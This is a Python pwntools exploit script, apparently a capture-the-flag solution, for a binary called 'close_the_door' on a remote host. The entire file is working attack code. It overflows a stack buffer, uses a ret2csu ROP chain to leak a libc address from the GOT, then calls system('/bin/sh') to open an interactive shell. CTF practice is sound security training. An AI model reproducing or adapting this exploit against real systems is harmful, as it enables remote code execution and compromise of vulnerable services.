#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 138.68.147.93 --port 32661 ./close_the_door
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./close_the_door')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '138.68.147.93'
port = int(args.PORT or 32661)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004008cf
b *0x0000000000400907
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

if args.LOCAL:
    libc=exe.libc
else:
    libc = ELF("./libc.so.6")
pop_csu = 0x400b4a
call_csu = 0x400b30

def ret2csu(call_func, edi, rsi, rdx, rbx_a = 0, rbp_a = 1, r12_a = 0, r13_a = 0, r14_a = 0, r15_a = 0,pop_csu_on = 1):
    p_csu =''
    if pop_csu_on :
        p_csu = p64(pop_csu)
        p_csu += p64(0) # rbx
        p_csu += p64(0+1) # rbp
        p_csu += p64(call_func) # r12
        p_csu += p64(edi) # r13
        p_csu += p64(rsi) # r14
        p_csu += p64(rdx) # r15
    p_csu += p64(call_csu)
    p_csu += p64(0) #junk
    p_csu += p64(rbx_a) # rbx
    p_csu += p64(rbp_a) # rbp
    p_csu += p64(r12_a) # r12
    p_csu += p64(r13_a) # r13
    p_csu += p64(r14_a) # r14
    p_csu += p64(r15_a) # r15

    return p_csu

p= '/bin/sh\x00'
io.sendlineafter("> ",p)

io.sendlineafter("> ","42")

check = 0x602050
got_read= exe.got['read']
got_write= exe.got['write']
pop_rdi = 0x0000000000400b53
pop_rsi = 0x0000000000400b51

p = 'a'*72
p += ret2csu(got_read, 0, check, 1, r12_a = got_write, r13_a = 1, r14_a = got_read, r15_a = 8)
p += ret2csu(0,0,0,0, pop_csu_on=0)
p += p64(0x0000000000400909)
p = p.ljust(1124,"\x00")
io.sendafter("> ",p)

io.send('\x00')

leak = u64(io.recv(8))
libc.address = leak - libc.sym['read']
print hex(libc.address)
p= '/bin/sh\x00'
io.sendlineafter("> ",p)

io.sendlineafter("> ","42")
p = 'a'*72
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh").next())
p += p64(pop_rsi)
p += p64(0)*2
p += p64(libc.search(asm("pop rdx ; ret")).next())
p += p64(0)
p += p64(libc.sym['system'])
p = p.ljust(1124,"\x00")
io.sendafter("> ",p)

io.interactive()
